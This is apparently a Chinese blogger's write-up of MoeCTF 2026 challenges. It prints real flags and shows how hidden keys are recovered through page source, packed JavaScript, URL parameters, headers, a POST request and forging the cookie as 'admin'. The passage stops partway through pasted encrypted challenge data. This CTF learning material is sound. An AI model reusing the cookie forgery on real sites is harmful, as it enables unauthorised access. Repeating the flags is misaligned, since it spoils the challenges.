---
title: moectf-2026写了自己感觉蛮有意思的题目
published: 2026-08-09
description: '再祝自己生日快乐，没想到是在武汉写的题哈哈，边旅游边打ctf'
image: ''
tags: [网安, ctf]
category: '比赛'
draft: false 
lang: ''
---
# 星走路的旅程-level1

## 启程第一站，这是哪个地方呢，flag请以如下格式进行填写，moectf{机场IATA代码_手机厂商_格林尼治标准时间(hhmm)}作为flag(字母均为大写)，比如，机场是西安咸阳国际机场，拍摄手机为华为，北京时间8:27拍摄，则flag为，moectf{XIT_HUAWEI_0027}，flag的md5为113d5f2f393a139b3b6586529415c090

## 图片
![题目图片](/posts/images/moectf-2026/level1.jpg)

展示mac的惊人之处吧！！！这种只放两张图片的人最狠了！！！

![位置图片](/posts/images/moectf-2026/weizhi1.png)
![设备以及时间图片](/posts/images/moectf-2026/shebeitime1.png)

直接出答案！！

---

# 查分系统

## 数学分析BII 期末成绩查询系统，你知道小M同学（moectf）考的怎么样吗？话说为什么一个查分系统是一个静态网页？

看源码里面有
```
{
        "序号": 47,
        "学号": "25192837465",
        "姓名": "moectf",
        "专业": "计算机科学与技术",
        "Ⅰ-1-1": 10,
        "Ⅰ-1-2": 2,
        "Ⅰ-2-1": 2,
        "Ⅰ-2-2": 10,
        "Ⅰ-2-3": 9,
        "Ⅰ-2-4": 6,
        "Ⅰ-3-1": 1,
        "Ⅰ-3-2": 6,
        "Ⅰ-4-1": 3,
        "Ⅰ-4-2": 1,
        "Ⅰ-5-1": 0,
        "Ⅰ-5-2": 5,
        "Ⅱ-1-1": 6,
        "Ⅱ-1-2": 1,
        "Ⅱ-2-1": 6,
        "Ⅱ-2-2": 0,
        "Ⅱ-3-1": 4,
        "Ⅱ-3-2": 6,
        "Ⅱ-4-1": 2,
        "Ⅱ-4-2": 8,
        "Ⅱ-5": 0,
        "Ⅲ-1-1": 6,
        "Ⅲ-1-2": 4,
        "Ⅲ-1-3": 3,
        "Ⅲ-1-4": 6,
        "Ⅲ-2-1": 4,
        "Ⅲ-2-2": 9,
        "Ⅲ-2-3": 3,
        "总分": 123,
        "折合": "moectf{y0u_c@n_reAd_th3_h+nn1}"
    },
```
---

# Web 安全与渗透测试入门指北

## 欢迎来到 MoeCTF 2026 Web 安全与渗透测试赛道！请查阅本题目的附件（入门指北）来简单了解这个赛道，并获得你的第一个 flag 。

查看解压的html源码发现有
```html
<meta
        name="keywords"
        content="MoeCTF,Web安全,渗透测试,CTF,网络安全,Web入门"
    >
    <meta name="author" content="Patricia Of End">

    <!--
        你发现了藏在 HTML 源代码中的信息！

        flag: moectf{W3Lc0me_t0_th3_W0rLd_0f_w3BseCur1ty!!}

        欢迎来到 MoeCTF 2026 Web 方向。
        请记住：前端隐藏不等于安全。
    -->

    <title>MoeCTF 2026 Web 安全与渗透测试入门指北</title>
```
兄弟这道题确实出的非常好，提示给的足还可以当成wiki用。

---

查看网页源码有`<!-- Key2-QDBtNG9k -->`
查看网页来源发现文件名为getkey其中有代码：`Key3-M0szeUVuKw==`
网页源码中有一段js:
```javascript
      eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('1.0("3-2==");',4,4,'log|console|N2ghNUkkTQ|Key1'.split('|'),0,{}))
      eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('8(()=>7["\\a\\9\\3"]("\\5\\6\\4\\b\\g\\0\\h\\3\\i\\0\\f\\1\\1\\c\\d\\2\\2"),e);',19,19,'x4e|x6b|x3d|x67|x79|x4b|x65|console|setInterval|x6f|x6c|x31|x54|x51|5000|x55|x2d|x32|x68'.split('|'),0,{}))
      async function pollKey() {
        try {
          const res = await fetch("/getKey?id=3", { cache: "no-store" });
          const data = await res.json();
        } catch (error) {
          document.getElementById("api-status").textContent = "Request failed";
        }
      }
      pollKey();
      setInterval(pollKey, 3000);
```
发现key1的线索：`'1.0("3-2==");',4,4,'log|console|N2ghNUkkTQ|Key1'.split('|')`，即key1为`N2ghNUkkTQ==`
在key3的文件中还有这样的信息`Do you know url params? Try to get Key4`说明要构造url来获得key4
因为在js代码中看见`/getKey?id=3`，所以在地址后面加上`/getKey?id=4`得到`{"key": "Key4-ZXJUaDFzbGE=", "message": "Do you know HTTP headers? Check it. Besides, Try to POST this api"}`
那么根据提示查看请求头发现
```
HTTP/1.1 200 OK
Content-Length: 108
Content-Type: application/json; charset=utf-8
Date: Tue, 11 Aug 2026 16:13:27 GMT
key: Key5-ITkzdA==
Server: BaseHTTP/0.6 Python/3.12.13
```
其中有`Key5-ITkzdA==`

得到flag:
```
moectf{N2ghNUkkTQ==QDBtNG9kM0szeUVuKw==ZXJUaDFzbGE=}
```

发现不对，一看提示原来是要将这些key发给猫猫

那么使用post，结果误打误撞弄出来key6
```
fetch("/getKey", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ 
    key: "N2ghNUkkTQ==QDBtNG9kM0szeUVuKw==ZXJUaDFzbGE=" 
  })
})
.then(res => res.json())
.then(data => console.log(data));
```

```
[Log] {key: "Key6-ZnwxbGFA", message: "Try login!"}
```

于是在地址后面加`/login`，出现登陆界面，按照给出的用户名和密码，得到下一步提示：
```
Do you know cookie(不能吃)? Try to login the account of "admin"
```

根据提示改cookie为admin(MAC直接在储存空间里改cookie的值就可以了)，还是访问/info有
```
Key7-NGFAZzY5Nmc5
有一个文件限制了爬虫可以访问的内容，是什么呢？
All Key body are a b64 string, try to decode
```

根据`有一个文件限制了爬虫可以访问的内容`的提示访问`/robots.txt`，有
```
User-agent: *
Disallow: /f13ggggg
```

访问`/f13ggggg`，有页面可提交钥匙，并有提示
```
合成钥匙
All the keys are a base64 string, try to decode it, enter the final string below!
```

将每个key一个一个base64转码可以得到`7h!5I$M@0m4od3K3yEn+erTh1sla!93tf|1la@4a@g696g9`

最后得到界面：
```
猫猫驾驶飞船回到了地球，这是猫猫给你的答谢！
moectf{b2be166d-0a61-e7d0-3a39-655c76cc2499}
```

---

# 查分系统_revenge

## 老师听说上次发布的系统可以查到所有人的分数，于是老师让沙包AI完善了一下这个系统，这样肯定大家只能凭学号查到自己的成绩了吧（学号为8位数字）

## 源码：
```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>数学分析期末成绩查询</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: "Microsoft YaHei", sans-serif;
}
body {
    background-color: #f3f4f6;
    padding: 60px 20px;
}
.card {
    width: min(560px, 100%);
    margin: 0 auto;
    background: #ffffff;
    padding: 36px 30px;
    border-radius: 16px;
    box-shadow: 0 2px 12px #e5e7eb;
}
h1 {
    text-align: center;
    color: #111827;
    font-size: 28px;
    margin-bottom: 30px;
}
.form-input {
    width: 100%;
    padding: 14px 16px;
    font-size: 18px;
    border: 1px solid #d1d5db;
    border-radius: 10px;
    outline: none;
    margin-top: 14px;
}
.form-input:focus {
    border-color: #2563eb;
}
#input_sid {
    margin-top: 0;
}
#btn_search {
    width: 100%;
    margin-top: 20px;
    padding: 16px;
    background: #2563eb;
    color: white;
    font-size: 20px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
}
#btn_search:hover {
    background: #1d4ed8;
}
#btn_search:disabled {
    background: #93c5fd;
    cursor: not-allowed;
}
#error_tip {
    margin-top: 16px;
    text-align: center;
    color: #dc2626;
    font-size: 16px;
    display: none;
}
#result_box {
    margin-top: 26px;
    padding: 24px;
    background: #eff6ff;
    border-radius: 10px;
    display: none;
    line-height: 2;
    font-size: 17px;
    word-break: break-all;
}
</style>
</head>
<body>
<div class="card">
    <h1>数学分析期末成绩查询</h1>
    <input id="input_sid" class="form-input" placeholder="请输入 8 位学号" maxlength="8">
    <button id="btn_search" onclick="searchScore()">查询成绩</button>
    <div id="error_tip"></div>
    <div id="result_box"></div>
</div>

<script>
const commonIv = "bW9lY3RmMjAyNml2";
const encryptedStudentData = [
    {
        "数据": "kCyxN2+qCfUK3LMzZQzM5UqhVK7pIfstn6iWuR/HRZHnZlJtcw3CqD7IIJZDqxBsM2Oy8FvZ3RrmXFAoxbsYLHWz2pwZkMXrYHWONUrGaqZYqoKBO82Ax/kbIpqFt4tOWLU3KiTrBrKlf1sLlDbu1s3h4oC85VfM7Xo2XDxFJH0ZBoxAZamyCj+Lc3xW7k4esrG/UsOjLeCCkpcULK0uAUyvUlL5L57RmXKregggHfYIHlnL2wWkbxl+MvXBfLN2+g9dg+LNBWqTotnlnZkdyPTLc3Zd7haUKAcm7ZscbKs18FienfeZAoZnpcYy+PERStZsM/lfbiktM2qm9zm2yR5XyprlMiXJHNEwQA+BBmdUYFlKaN5twrGjN8ymc2xUU+nvgYyFrZEzyQn1Dji+0d4HQBqLQ98Vf33zkZL9ScaZIOjcmoIKFjDZ2xm1gwfZjs0Xx72XPSYiNeLbfbIrAAqg187y52EO5GR9T6SSVzd8Q0f+GlkH4Xb5acyksFWz2gniAEKr10fVaDk6LYyzEtTvJKSPR6yZs3vfXumT0nl87JvyIOeo1ID3/QyRMbvXhqPCifLa9NWbQz32rRd+UdiTPgN531aY"
    },
    {
        "数据": "d59lTEJCN9NY46flAVfRqDhJDKGTq59ML7DUn/2YgxlVXV/JjlVCA4FUM1W7GMjPFOClKQGXP3bJqLIWflLqhMcCkKPInCdNmzWwTWx/JSxtboDmlUJKJwQuTH+ZBGyXNXtIpxJAPi+dFw0b2k9ol1QuDgqvLKP+6FOHxhh+7JTgdrilDMh8wMah/6aLYFbrVGiIIR1ZNcvKO0xq7WrM4G0Sv4mnmXDmWEjze5BeQrqzEXMNVmQFqlgSAWAnaP1UrZi8uVKa0h5fLxjcDluiuTJNXkPa6HzDqYHLaLZxHlES8CLNBSodto8UCxegdqVB2aZa1WXnm58GoZ3BCXOykBsNc3p0Q1oXq09y3kGfYwe1aN53kOewU/jlkvX8cijbvZgJTYve8BBohAmDUEkBHFverUBIYpLXhnrAr7QcgnfqwazTfKzjGhQ5dyNPXbdWfMfwMA38TMcvHz5JO1uUWtJCLexdmksp7Uh369btR2ACbQazcppfbIqJvgGPYkH9OimronH96WAxwkwtAkUlAE+8RrcHAZfPdm++JMlL/8Za3LbumbSbE5q2zNkHfx6AZHT7TNiblpt9mLbGf1BLaSfbnupgskfrJiEdySlSeK1viSvQ"
    },
    {
        "数据": "vq3A1zwnhjYEsFHMOaVmIjtcKGb2prkFXd1q4C3VNVbCjS7CjhX6OgYG3ByRxRiFAeaiFP8V6Ro7nl9zKNLVz80en0LjhJmcmFxY9FXKTwEvv9nNE0Dy04+rYIjZ2j4ozYRxqxRz1giuSTe7TO3WB77OE2PnwA/FkEujuHY5zxv2J4LEd18O+2BrP9DLtWLTIsiQw5O2pQ1Dglbd88/Wgo14kgYPLDHy/Mkj/lrrWmVvKcOu7Jn42HiHgQak4IVpD1ZFiyavpM3/ahMgsWkBE8ZkK+STLhms4Dy3xorHWQqvHShldKA3dZB7wLDbl+9kYta8d6HaVhtT3zpiUDxpLWpkahQ/eNmNeLTaMPttrl0NnoyhzsM5OWvgo9V2RyQ1psJCTny5/Njxk/I9Z8pLJF5vdqA69bILJq0rMkpn61yTaMbzUv260KRJ8DQlQjCRcON/d5hQphbRXDXSpzpv9jU9ls1olLDZrSezLg0EpMMHsxqtZm2gCHZZoxUrGeC7cyiCRr9x9BWEKnQt5Rkg/Aajo/clG9H8q27QG1xXGXMnlDb3VARBLcigiXJKb+nWGSOq14w8QxlY7eZjroaDWu5QAeSWrvGE"
    },
    {
        "数据": "MGRqn7tHZ+ltCIKWspIyabYIxiALMzpWomr6kLZ4iaPWnkbrkhwNmcK+UCHgBwnHI2L+W1vbKVNycQejVdRwwEdOzIntGcLo2YXR8bpNmeIkPHiRZBO1+ge82AVLU89bSOz1RuD2mBdbIBxirjUiPyvxQoa6+qx0xcbFNLCDimcxWE/NeMmd6eXJufLQf62eCv+Emr0lw6PGKB/xl9UnvmjUOwgVNCPv75tjcwo+MNylL6OgxvPvdHecg5ViZ56C26qel+w5dpLdjQcRQKGs9TLVtXRnaF2aVoMwD0KLodtiUC8HBvPyIwYp+KZABxix8ceM2Toa/0v4CZVkHNiFUQjp5YNwJn0LZufa9ND5QtQPwBinH9fnh/R6s44jL4sQhj9nGwIohsginyaZJ1zVIjQ1sBgqrg30Y103gNnl9GQVHoXfaOgj/wHchNMXiu2q+xW6rLfDOomOLEgp2w2R74xZhb0+1LGMBK3ZniFH/YqRRLVdozsoJtg7tROYOGWNiUFNfkfsSBZk1ldusVfsb3/H02RwtptIWQe/klxyRkh1zHdInt5k8xSdTWioxJi11CrQmxO3LQVCXHHr/znxVu2bpII="
    },
    {
        "数据": "US8Fk+KJR3s4hgdSicriPdRhq2vNaXW9Wa/3hUzpT2dW9a5tpsh9hB2hiX1ka/Qs6L3V/H+AK0n1MuJkGyjXaOcUhkfh3EpMbcqpvJg/IzxKkeVKp6FyHyTfliFrKRN7MlY0QBj1gsS/YIU8Ax6ydcVuaws4TrMGInjq37sOy2zPhkLEpfWW/DNn0F9pZgkZqUiMVdzxrCEOyCBTk/qHvQWil+VjGagxdTiSoOTK9qPN6ToiqL9tDEd4UamC8g4v+WccQ0CaXLlpTxXP2Evzw8AUT0SyV7IzSYSrnJfmIr6fo/QT3037c+eDIJ5sPa7E2vTy6xZSuk1mQx9ikx9rYCOTyDJSXY7o1BhZabQLTz5Irns0a+UPQYkk+XZIzEVUPn1mp/6RaqaVwG3ATP1PQLqTLPwCCTYbw7DDO9DAfJpih+v04SvgCmf/bsUVm6dSTpMeaDfLBOkrczFvluvKdeFbQVP4iX0t7FkRJcGbz5ep2pSxnlP/db0qA/K4jAaSI6+GOH0BxNCgz0VyU03RTC3UZ6hnothmrWAmtHVYesXW5o0ufYlReR9iiPfvJuxIzGZ9bnMv5XM9QwQ2oCVLiqPVVFAIXw=="
    },
    {
        "数据": "Grrg+CMbm/D6py58QMkbLmn5ssf4ztt0jYwYObqTMxNMTsjAZ/hARZ37Wq1vlSgechQLCgadI9kYKdyFNPITD933U8Th9k4tP9oh4rbxAVBvG6Cp0/4sN4lbAyKe88Mp9pUHI0OZen6ANMLbUguy+PDDxzmrQqOg2M/Rd921sK2Ni824DgO3dWI7lfQF5exyf0ILfisFkS5TiKaRTH1p8DWLvW6Atgd2yzdVwd0cJGC1dfQ6+jlwXCPE+PskRPRVMljRL35jUmaKpMWKfrHE7L8Pe7H9XcKV+o/ZD1iZxQ1MExfFbBgEcyezvze9TWzrqTE9He1ODwi/nTEx8U1dd4u9GvSomHvxNhFcjWOfrekwRwxL4qIUxzEyOzhHAzrBaggpJ3oPU2zTyoC2zQ2wzLvOjdnzzB8/vMvnuCB3fv01Aobusd5bewJui5G40t7Hmj3Cq78pbbGo+QFbXBQlq8aj8Ab3vFTlONb4hAZLWs6hVRQxbVShKHS0gShk9joPil8XRpMjECEwl/ZR2m9gb7AviQENph1qyDM/zYII1ySPRtRjiOinFCJa0906L0+nI70JzSTfXqIQ62dcVeYS4VxwsWYiDqqnbc+6Oobkn0ZKJa36NunJtdUf2/mfOeQJbA=="
    },
    {
        "数据": "Cpal6SS5KwKznDS8ErnRu7l8oNYq1ehI+s7VwabT+wTDlUSQ5evJnZS7LFVDqinCP3rhCaeFuMj/wx2JFz39GJGk3g28a7F7f/bAjF2vSQsYik8behd+toKooWjc29cSIXOJQn7gIUENElM+utpnwQf1U08TY55aJVQNCD85hHEhhaUXqNfdsXeFcScjYuhdUU38edw0ybrWAYkR6cUMiQMjTVD2yRwaG45skxZ71iZztamxP4N50dzTbJiYvTjZZCAxRKuIK2hY4zZ8hEQqegshf/cxE/prL2yXjI0IuqGIE4PydG3Wyn7fhghp0GQuGXaYjb6qL3SdbG+cAPzc11m7lMwIpD3n5v5GdzqjqvVHiDIDpZ2nKLLuQWSFm8TEJDVwjmjSkJ9s+t0pLn213rFleKWaKY9Q2AHmk1gZxEZ2857DdBecmO5bOpX+X1wCf6ZcCQVS9Z5RrBgH7KsVKvcAO9nFYn3u06Mog8461UhlikomuJYm1HpHuwShhfPkWwhZ+8oi6N3+saxXlGs4W4uBHyBr1CoB4e7qFWruUvYl7s3tFspb4A8vQMJRkqslgDNL3zXEXVTTJqRXLNJ1PUoW8r3KRg8NocLRyJ1C"
    },
    {
        "数据": "Y4MVB+kaSn7HXSrLrn3W9lExzcQ/h7P8Cq5ftj/BDlmcGPKKFPyr1BGCqxw5gNEM25HCSb9ZPhEAeD7k3yd0z8G548q/e78Di6Nu6/BVGHan0rHT3ZtV2jV7R98BmIKjMshpXJRqfBoWSqrV3VCzlfWPV27KFyBo4aU1eLU6yDqbtYy7jDl9U2tWLGS8OmPo04z+v5nVJ/fcqqONbxPHXEFyDsAqN66fQiImFjfnmc8QsUGHsQiJtNQEQpBGHejdsaYKEF75BhFcbJvqpLfXGLa4s9Zd20qjBlIt0UMyB60skSB9+UM5xlYTbsz97Q3YqzPL76+st+atuomY9en+CJCIvqDqOSvZO4wHWh0miqCgKqFDHEcPAGC4rrMgMWYhuoD2oP3tSQB9oKuuussv0IDLEG/eqty87SyTyJyvY6igPhMeEHTYMRw/+ELr3Aeo9A7MFUgmQQfUCXSfYBLF6tmoUWj+xpPZXjZ/Z/VzNJyPqMguMjrdLIWPa49Gotl9ICmSJ+TRxVjx+dWMNAcIOtWxYyrCxo/AklKGFBEHz4kU1SsaIA1+kumlORp7JHFDe2eYUAvqDL+2i1BSYSylRLDI+gVWTk2q"
    },
    {
        "数据": "ouiyzlxeGC0B8yWdbRFAqVdZtodd8aebGvRE7CRWBA5aZTgLuXyfckfSlrrFSxESei+0XULFZuy521GKagFQDTte+0rGrMh9dVW/rtyW7dusY4djmdrgckbW4wCFQm2EK3g0h+xhixuaSXuVBMbotX2FL36IIooWWYybC00/uFsWGfklWqKuf0xluobncQzjTjAOQxmuNUjJEwZRawwLOmf5Sh0bbp0/StyvM632a9kbCOH+RsSVqei6XWMTKi9Z0l+GVIBnFm6aQCQJ4PgflsxR6PqJ/h9n+UspFaywqwDfZKfKy2UE6xCtKKp9o2FcGMa91ZBYZ/4MGCzBgcLIeIknDR2/A7BrZYdwcu9cRP2cg96atBxZ3BX66ai+AKmtga3ZCihmR7Tr2btzOtv+xTmb9Y73CIAzD/PqfZCNmb4rmHcCEL+MVTzaChvT47PMTdUtrVRlfMcdtMKLTPQcbhJyS7X+MkQo5dk4O4DoDk29NumcaDDTMRtGwkbE5xf/jruPTKo/UbycydGEfZprWovI0TOpPSWPcQ+dy4VQXcmXmGU1D8qEBHTvHJu1W0I3XN4jcVeIYjv/z3Dnc78o5/wDvYM="
    },
    {
        "数据": "djfw1prX8tF1ACmL3UdAHbWcsOd6iIdYR9yNkNOVdYqfT+CMe8UMyfW7pkCkB+j1TThEDC75NqsgWJZI4YwiJ9VtrSdTCQ+6DGDTVp2ze5gyUpgv8TGHP/aI53rwdVwUftxWW9Vio+NaPZbvGYI5RZ3L1ljwT84k26W2IpydSo3cA7LGvJf/3AsPQ5N8MePwmJWnf7Y+IZdbiahCbRBj080gZFSEXb2h8DK8tjX/5Udfojz8j8+kFR0xW5AxyekXBfDr+zqYFhfi8y/olcOJe1xfm8l6WmWjxayzelxSiwzNibcfSzG4zSqAsgmknxK2DAsBZdGkel+AfS1vyuJ89Ty+9Ploen9lKKCZnbw6FOYUMY/zA1akTxROTpycIK0ihVU6wh8P70I0AUwHptZ+k74d7VZJEjHrjyYwQT913rxsO6Acd1BP0K40MwAFWe8hpL/Ux4CZV9rClbIA1/a0LR7AsXqptB67ptFJLCObAyycfF6vQ2xa1I77F/ZDxzGYNfyGYBcGYThg+scNf8MBgxYI08WjVlitkas3Xy5lSWmEZLQ0awkP+POVQwRdy/ScQIy6p0XlaRenuDytaqshPnFuxvuqchiyyNq3LwcWyR6fASt8RT8yxw=="
    },
    {
        "数据": "rxwXbQPsz0x/yXejwGL5tVFXErOdDDJ/Bds5Hhmm5LHrdwgWLVknbK6gCFb5N17BLGvFA6uhQM3yWTvpuHw3ZmcEx8RaGQBdwdbyjt2JHw4jL8ewm3fPjzcex/kaiZ1zSzzZLK56Jk4sAXLqRNBeCzFkhml7aRAFLMLQp0iKyjuKETsEpmG2P1m5YVStKLMneQbqDRYCoh5g4YZ4loFwuksFRTnw8vxWFctyeX38qBV6M3JF7gxYgJw8T2OWj2lAx0kFW52//YsUb/HkBGC/97xmer96cHb2PN90wfJnIp1s4KUT+shouXYnVyWPrcgnd510/L7Uftph2tc4CUzAsHk1+mS3u7KYTixZLHvzTq06vnn244w00F45Y6sfLG3DnZLKdQYaxfySyv4QssYVFBMrgu9mLPHLKfS9AgnNYSIvJaNTcmxwojfJEn625nSSr8cdf7XT5J0JT0jReTZQLLEaUa+U+hQlk9ip1bVGhpgJnHO6wThfAXvgxBdwhMcDe8EyzRqj8XTtndd4l7uCDDxHD9meqftYXgxx/X7xZoP3q2X87L8h625AlP/g/l9wq08IxUeYp+IYwbHktz1QGEN79G+af/b833NqOw=="
    },
    {
        "数据": "8w/4ABLAXL0fmBnBi94zUpGMFM9CwA+RraOR8wK9ZJJl/IBDupU8UQxU5fA89/FQMcJWQnDJNhqiweXIIWXyVe9/SEpMTRt1jwrAb3lwLJIBSfMtKX2Q+vnF9arTd6FZVm2CxVKWqfm7HiNuPxcKJ7Ehu8Gk63RLB4BbdGNzPlCkfd2D7dYSmk0DPKzXD94msNmbvPrEIwpiHZpx5rj8WFK30m+GqKKLEEhDanb67lrozJuJcJs9DDwDSBq8rtnnNq2xOiTf7Q/V1npZzUReJbtmXoKBEYAjc1h+bSMGLvjqgdJpy5o3xn8LHAgqWrc6M8vgxo4egNc75mZx3RPJkj2FV82xbgjhiKzdscgRVgKR++GDhukKRSWfgIKqsEYSAXD3eFUe7tSSJRY14A01JDnZDTRX0dRuDrJr26c/E9yw4eKhnkrNSeiTG5Pe4W29NqvfEtmkkbkNwNV3ARNKwM4Dqr/ZWUCv6zVGi393Yf2SwIt/kZ6iNghV2S2qgsZrB+mjr0VpraSjJPVIFF71AkqSLrS3WiDI3mk8EUSsL/CLab+BIznBqhHkkuCqL0JNfkr47WTJA1iORnvobXKbAGOCPkuDUcGC58JiYNIcV1IJkn+yYmSB"
    },
    {
        "数据": "IQhUCIvW6JpUAtGPmz2MeaJ5jhzNdnZqdsGlgwMoPvEIwueHzhh2XPvhk7nMwWW2HnOI2q2aPEIdJIvAwfEOVriX4YLITRLexs2U6Eaj4wST9A5PNc6kg2ILJPzRUrBLGd/paGaU45PCEyAHO9x08PuOgG6tMwLJnF2IiS79k1c/Initp75GtozhvuMg50nFoXhRqpVQwFgs5c98o5qd+8BQeEdTttrMjQJBTqFJ6XDyNgCfYumh7xclMH8byZKY1Mh3Ic5UllTD98QLlkkUndq44q7qLxgWAfBxC0LssrEGMr+I5vJS7O6j2hNu7qHwdmZ3MWIc/iHjPVR1+9vF6Zen5hFuZPS/M+e+y3nibFFFLZDhiGZjDqMhTfs1Eff93TJ4dPZIZV4fHEKzhEDYdgcdjAg7bxuV++Jl/jXq3lBKf38H6K/eI2FXOqnmkP/E//O6Q9X6e96XxzW7OXZtpkqrxGTcK/vngYj7uEafkebMRWiM7byl6pNX3ImJmn6sWZZ/LpnB6LLQILmbGpOEbP36SNqhvspjoZWgyFxR5Fjgw4VlvBSpPoVECDKFSxfpG8cjJZANHEcxtLx9ZDNwvdCjr7z/5t2UUQl476oKlWerBZxY8lRbaVAFSmA="
    },
    {
        "数据": "oZUE0XzS3VCWAUaNGGM1nyITkM09uSQnsA2C6smDW8TNtwC41KG+ja1vTj6YNfG2Dh6ZJq4iQuZ/re+Co9YSorOQkaof6R4/fxubL7CwnrzZeuy2p3yDvrqIGZxCNjZlFJqKpCv0tU2rSjCFtCgNGaxM4LMqdi0q5RSiOnd330JfA2E9WqruzKGkNOt8gXdiPZY2XDq0gIbbqePzHJec8nNW/sojoVPk8YJzJwxCjziQWUpRNuw7kbQ5DM91bUAJ5/7YEz1sVIQglhkg77g6s5qgmzNJMS1kjMzdpt9ILHbz8NhvRgZfamer26ydfsgbbnjLUyJDRWN1JusmYIxrtn8ucI8L7fj/L5MixuMh3BFOtz/uoANwknKehA+390Ojl+JXnLrdc1VfwDAQcm5PiSNHDB7LIaLG0RGhxv8UmmknKkaw0xWbn3ucOBHh/d70G+EK1kHSkVbVkD+gIFHitZbttZQCz9NdDnnD9sCqGJweWVGUIdOluHNpt2cZKj3oszqpM2Npw3Uo57SBGPUnVn1U7B8p6uxPNEs4mA7DQAdOGeBQclP406xs6L9TifQPnjzy3qhglJcfWeoHYXxOH7vWjIZx3UD7"
    },
    {
        "数据": "gG9I6zlJAqq1std7/7QdeFeAt/WP8XqL9pvg3UDursFY7zoUQvjMB71Vi2S40r/a0S/Kx+c9NkUq5KisBzjhh/08ZtxebpQo+bNceKYMw8GQrkBO5KnP9tHSNVOMnOoBF27waTsgGUiNZHRuWKudvQq0n17/8JV4LOSrBsVz6T1+QsYPrsHys4ub+1W2WIuVGD/5oPF53zhXMEl+Hji8/8YmZFFwXA6bIN29q1nwxsTOP3mNR9DZN2PttRu3n2Dny4oWjNby/DpL8GIiMF4fZmbblxQM2L2VkSH2Xyny8KvHTBQcddzwL6HrV2eRMFIbPa8ecv2GemWnqVpK2Ral6rxVuGRwTzr396PELRMox3ves3+E+vM0clKa25G3BD9nhl8miHY/v9mxZK1YKhyQNXZKZVeCMrI6WOL4HTjS3fJLUMfMeB+qtk2tRXC/XbQjWpfRBvWq7nYQXs/wrRA+1is6llufr9I45apILFXmFam7t1NbW9z1dwZo79f6UMgw7lU9Q3iQCX8/wXol6a9iOMUnVqMz1Eem5hct/gt8tlR6r011ueXnJOmLbVXDQTSh4F7xcAJjwO1STwmxAmvonC6L4KQl4cG8ohuulV0/Zak="
    },
    {
        "数据": "p+xLeP7s8OYdqHfeA3PjaepjohSWL9/pEn3exMDzQc6jF9StO13hX25460qhi4pFcf/mbpRXy77iuP6Y4xlghedQQJzyktAWa/u4typQj3hbGvHpBVg4lE3u4Q1xNZ8IbbqzcOUPu51lM5ROP4x8nBGpKxEehmqQ7YXrUMXR5BAwSl90jLMfv3BXXus/iWkKs/FcqpeG0wxLrzl9fX3AShBDObsCwiKmeQTfo9VARKA0V+KRSj9/hF1XlbAf+hN0hKvnlf1UrsZyF4XO0nuUFYTvdIVQ1ZN3iZiS5kDpPuSaEUjXV/XbT55Lpubu7zPIQM6Bbyx9BYToAzf5QUr2gKKA7SHXLvbd4PcRsPVwxK2rxHo9Ws1vQ+x/+5oOGB8GOgDegivxWrtGC8KJ1a278Llft4vtxxL7HNjjGLEf3fzMPByOwZEGbi9Bk+2vJYy0ceXJJkk+1uMJVV/J11T0MzsdtA9Umbw49C0pS5DJVbpFUDQYDdJsIUdEQ5d7N8pi2cbCe0wRNHXGTFQMaxcHfxCvMjKebi8l8f5ZuXvL0klqnMCN7MqO22CEk9/2eLm2qUJqjFKry2oZ1RaPTd1gWVvVQhw24I0="
    },
    {
        "数据": "dO1VjG9IkrU8YxQ78GwIzQMYFAGikklYGUbPzJ6LjWbtsEB95NpneRd1HYnB+JI03Euc5feI+/JJJtXC3X6/VgnVglBBc4zs0giALStNm81mBgJgliP6qGpOrQJ3rlxk2GZkBCKzMenErTgFMDOlvjXSVzPkrbdFEaNTrgG+6ZcJ2hHbTdmKhqEqOQGiYTdCNfaNnfV/XWT3ZzSOeAzKLAcrKGcdw5isXvdqE86M2+U95g636dx9ETsg3hhXl5cnFxz9v105wr0f1A6IzqXQm1PzkrMu3AUJPmZ4HgBXIcFe5dfmNtR5lzZ+M8lmvgg83AwjU90JWb7rWbr77kNJdgN4hrDtn5Y+ZHd6wfK3RC3ELgtw46cUXWp7PvI7zGVuu9a/EjufPyAX5Py2WvLoqgTp1Biw+GyZlb/cd86ribAefb2XL0BEpGMbHAm7ofhXnLUqBNczpE6B7jOK6blvC/1aTufbZqlc1dQ2iIU4hUM8mFn37S1w6BS8IzK9rQyhIZYLWY+yJoKztPgUCUZJIIm6ivCbBLoaNvvUm90FLfeBgGn6FDBp6K0q8q9w4tNlgCvhhcRw63rZiF/McUQA3O2x3HFGsfPyYI480dQuQVhUKA=="
    },
    {
